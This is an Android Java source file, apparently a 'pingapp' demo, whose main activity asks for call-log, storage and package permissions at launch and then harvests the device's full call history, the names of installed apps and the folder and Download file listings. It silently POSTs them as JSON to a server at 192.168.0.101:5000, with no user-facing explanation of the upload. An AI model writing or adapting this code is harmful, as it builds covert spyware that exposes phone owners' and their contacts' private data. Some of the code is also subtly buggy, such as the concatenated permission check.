package com.example.pingapp;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.content.res.Resources;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Environment;
import android.provider.CallLog;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;
import androidx.navigation.ui.AppBarConfiguration;
import androidx.navigation.ui.NavigationUI;

import com.example.pingapp.databinding.ActivityMainBinding;
import com.google.android.material.snackbar.Snackbar;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.OkHttpClient;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    private static final int MY_PERMISSIONS_REQUEST_CODE = 41;
    private AppBarConfiguration appBarConfiguration;
    private final String tag="MainActivity";
    private ActivityMainBinding binding;
    private OkHttpClient okHttpClient = new OkHttpClient();
    private JSONObject fileObject = new JSONObject();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setSupportActionBar(binding.toolbar);

        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        appBarConfiguration = new AppBarConfiguration.Builder(navController.getGraph()).build();
        NavigationUI.setupActionBarWithNavController(this, navController, appBarConfiguration);

        binding.fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
        checkForPermissionAndRequest();

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @Override
    public boolean onSupportNavigateUp() {
        NavController navController = Navigation.findNavController(this, R.id.nav_host_fragment_content_main);
        return NavigationUI.navigateUp(navController, appBarConfiguration)
                || super.onSupportNavigateUp();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_CODE:
                if (grantResults.length > 0) {
                    if(grantResults[0] == PackageManager.PERMISSION_GRANTED)
                        afterStoragePermission();
                    if(grantResults[1] == PackageManager.PERMISSION_GRANTED)
                        getCallDetails();
                    if(grantResults[2] == PackageManager.PERMISSION_GRANTED)
                        sendAppDetails();

                } else {

                }
                return;
        }
    }



    public void checkForPermissionAndRequest(){
        if (ContextCompat.checkSelfPermission(
                MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE+
                        Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {


        }
        else {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{
                            Manifest.permission.READ_EXTERNAL_STORAGE,
                            Manifest.permission.READ_CALL_LOG,
                            Manifest.permission.QUERY_ALL_PACKAGES
                    },
                    MY_PERMISSIONS_REQUEST_CODE

            );
        }

    }

    public void getCallDetails() {
        JSONArray jsonArray =new JSONArray();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            Map<String, String> callHistory =new HashMap<>();
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dirCode = Integer.parseInt(callType);
            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            callHistory.put("number",phNumber);
            callHistory.put("call type",dir);
            callHistory.put("callDayTime",callDayTime.toString());
            callHistory.put("callDuration",callDuration);
            Log.d("jsonObject",new JSONObject(callHistory).toString());
            jsonArray.put(new JSONObject(callHistory));
        }
        managedCursor.close();
        String jsonData = "some thing went wrong";
        try{
            jsonData = jsonArray.toString(4);
        }
        catch (Exception e){

        }
        Log.d(tag,jsonData);
        sendCallLogs(jsonData);
    }

    public void sendAppDetails(){
        final Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
        List<String> appNames =new ArrayList<>();
        List<ResolveInfo> ril = getPackageManager().queryIntentActivities(mainIntent, 0);
        String name = null;
        for(ResolveInfo ri : ril){
            try{
                Resources res = getPackageManager().getResourcesForApplication(ri.activityInfo.applicationInfo);
                if (ri.activityInfo.labelRes != 0) {
                    name = res.getString(ri.activityInfo.labelRes);
                } else {
                    name = ri.activityInfo.applicationInfo.loadLabel(
                            getPackageManager()).toString();
                }
                appNames.add(name);
            }
            catch (Exception e){
                Log.e(tag,e.getMessage());
            }

        }

        Map<String,List<String>> map = new HashMap<>();
        map.put("apps",appNames);
        RequestBody requestBody = RequestBody.create(new JSONObject(map).toString(),
                MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/appList")
                .build();



        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(final Call call, final IOException e) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("failed........"+e);
                    }
                });

            }

            @Override
            public void onResponse(Call call, final Response response) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("response...."+response.message());
                    }
                });


            }
        });

    }

    public void afterStoragePermission(){
        Map<String, List<String>> map= new HashMap<>();
        List<String> directory = new ArrayList<>();
        List<String> downloadFiles = new ArrayList<>();
        File[] folders= Environment.getExternalStorageDirectory().listFiles();
        for (File file:folders){
            if(file.isDirectory()){
                directory.add(file.getName());
                Log.d(tag,file.getName());
            }
            if(file.getName().equals("Download"))
                for(File file1: file.listFiles()){
                    downloadFiles.add(file1.getName());
                    Log.d(tag,file1.getName());
                }
        }
        map.put("directories",directory);
        map.put("downloadFiles",downloadFiles);
        fileObject = new JSONObject(map);
        sendFileDate();
    }

    public void sendCallLogs(String jsonData){
        RequestBody requestBody = RequestBody.create(jsonData, MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/callLog")
                .build();



        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(final Call call, final IOException e) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("failed........"+e);
                    }
                });

            }

            @Override
            public void onResponse(Call call, final Response response) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("response...."+response.message());
                    }
                });


            }
        });
    }

    public void sendFileDate(){
        RequestBody requestBody = RequestBody.create(fileObject.toString(), MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/directory")
                .build();



        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(final Call call, final IOException e) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("failed........"+e);
                    }
                });

            }

            @Override
            public void onResponse(Call call, final Response response) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("response...."+response.message());
                    }
                });


            }
        });
    }

    public void pingFlask(){
        RequestBody requestBody = RequestBody.create("{\"pingString\": \"hello world123\"}", MediaType.parse("application/json; charset=utf-8"));

        Request request
                = new Request
                .Builder()
                .post(requestBody)
                .url("http://192.168.0.101:5000/ping")
                .build();



        okHttpClient.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(final Call call, final IOException e) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("failed........"+e);
                    }
                });

            }

            @Override
            public void onResponse(Call call, final Response response) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        System.out.println("response...."+response.message());
                    }
                });


            }
        });
    }
}